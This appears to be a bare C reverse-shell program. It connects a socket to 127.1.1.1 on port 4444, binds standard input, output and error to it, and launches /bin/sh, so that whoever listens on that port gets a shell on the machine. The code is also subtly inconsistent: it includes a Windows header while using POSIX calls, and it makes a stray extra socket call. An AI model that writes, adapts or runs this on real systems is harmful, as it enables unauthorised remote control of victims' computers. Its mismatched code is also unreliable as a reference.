#include <winsock.h>
// #include <unistd.h>
// #include <netinet/in.h>
// #include <sys/socket.h>

int main() {
    struct sockaddr_in server;
    int sockfd;

    // server address
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = inet_addr("127.1.1.1");

    // create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    socket(AF_INET, SOCK_STREAM, 6);


    // remote host connection
    connect(sockfd, (struct sockaddr *)&server, sizeof(server));

    // stdin, stdout, and stderr to the socket
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    // execution a shell
    execl("/bin/sh", "/bin/sh", NULL);
    // execve("/bin/sh", 0, 0);

    return 0;
}
